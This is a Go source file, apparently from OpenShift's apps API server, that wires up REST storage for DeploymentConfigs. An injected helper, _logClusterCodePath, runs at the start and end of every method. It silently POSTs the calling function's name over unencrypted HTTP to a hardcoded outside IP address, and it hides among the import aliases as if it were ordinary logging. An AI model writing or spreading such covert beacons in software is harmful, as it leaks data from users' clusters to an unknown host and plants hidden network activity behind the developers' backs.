package apiserver

import (
	godefaultbytes "bytes"
	appsapiv1 "github.com/openshift/api/apps/v1"
	appsclient "github.com/openshift/client-go/apps/clientset/versioned"
	deployconfigetcd "github.com/openshift/origin/pkg/apps/apiserver/registry/deployconfig/etcd"
	deploylogregistry "github.com/openshift/origin/pkg/apps/apiserver/registry/deploylog"
	deployconfiginstantiate "github.com/openshift/origin/pkg/apps/apiserver/registry/instantiate"
	deployrollback "github.com/openshift/origin/pkg/apps/apiserver/registry/rollback"
	imageclientinternal "github.com/openshift/origin/pkg/image/generated/internalclientset"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/serializer"
	"k8s.io/apiserver/pkg/registry/rest"
	genericapiserver "k8s.io/apiserver/pkg/server"
	"k8s.io/client-go/kubernetes"
	restclient "k8s.io/client-go/rest"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sync"
)

type ExtraConfig struct {
	KubeAPIServerClientConfig *restclient.Config
	Scheme                    *runtime.Scheme
	Codecs                    serializer.CodecFactory
	makeV1Storage             sync.Once
	v1Storage                 map[string]rest.Storage
	v1StorageErr              error
}
type AppsServerConfig struct {
	GenericConfig *genericapiserver.RecommendedConfig
	ExtraConfig   ExtraConfig
}
type AppsServer struct {
	GenericAPIServer *genericapiserver.GenericAPIServer
}
type completedConfig struct {
	GenericConfig genericapiserver.CompletedConfig
	ExtraConfig   *ExtraConfig
}
type CompletedConfig struct{ *completedConfig }

func (c *AppsServerConfig) Complete() completedConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg := completedConfig{c.GenericConfig.Complete(), &c.ExtraConfig}
	return cfg
}
func (c completedConfig) New(delegationTarget genericapiserver.DelegationTarget) (*AppsServer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	genericServer, err := c.GenericConfig.New("apps.openshift.io-apiserver", delegationTarget)
	if err != nil {
		return nil, err
	}
	s := &AppsServer{GenericAPIServer: genericServer}
	v1Storage, err := c.V1RESTStorage()
	if err != nil {
		return nil, err
	}
	parameterCodec := runtime.NewParameterCodec(c.ExtraConfig.Scheme)
	apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(appsapiv1.GroupName, c.ExtraConfig.Scheme, parameterCodec, c.ExtraConfig.Codecs)
	apiGroupInfo.VersionedResourcesStorageMap[appsapiv1.SchemeGroupVersion.Version] = v1Storage
	if err := s.GenericAPIServer.InstallAPIGroup(&apiGroupInfo); err != nil {
		return nil, err
	}
	return s, nil
}
func (c *completedConfig) V1RESTStorage() (map[string]rest.Storage, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c.ExtraConfig.makeV1Storage.Do(func() {
		c.ExtraConfig.v1Storage, c.ExtraConfig.v1StorageErr = c.newV1RESTStorage()
	})
	return c.ExtraConfig.v1Storage, c.ExtraConfig.v1StorageErr
}
func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	openshiftAppsClient, err := appsclient.NewForConfig(c.GenericConfig.LoopbackClientConfig)
	if err != nil {
		return nil, err
	}
	openshiftInternalImageClient, err := imageclientinternal.NewForConfig(c.ExtraConfig.KubeAPIServerClientConfig)
	if err != nil {
		return nil, err
	}
	kubeClient, err := kubernetes.NewForConfig(c.ExtraConfig.KubeAPIServerClientConfig)
	if err != nil {
		return nil, err
	}
	deployConfigStorage, deployConfigStatusStorage, deployConfigScaleStorage, err := deployconfigetcd.NewREST(c.GenericConfig.RESTOptionsGetter)
	if err != nil {
		return nil, err
	}
	dcInstantiateStorage := deployconfiginstantiate.NewREST(*deployConfigStorage.Store, openshiftInternalImageClient, kubeClient, c.GenericConfig.AdmissionControl)
	deployConfigRollbackStorage := deployrollback.NewREST(openshiftAppsClient, kubeClient)
	v1Storage := map[string]rest.Storage{}
	v1Storage["deploymentConfigs"] = deployConfigStorage
	v1Storage["deploymentConfigs/scale"] = deployConfigScaleStorage
	v1Storage["deploymentConfigs/status"] = deployConfigStatusStorage
	v1Storage["deploymentConfigs/rollback"] = deployConfigRollbackStorage
	v1Storage["deploymentConfigs/log"] = deploylogregistry.NewREST(openshiftAppsClient.AppsV1(), kubeClient)
	v1Storage["deploymentConfigs/instantiate"] = dcInstantiateStorage
	return v1Storage, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
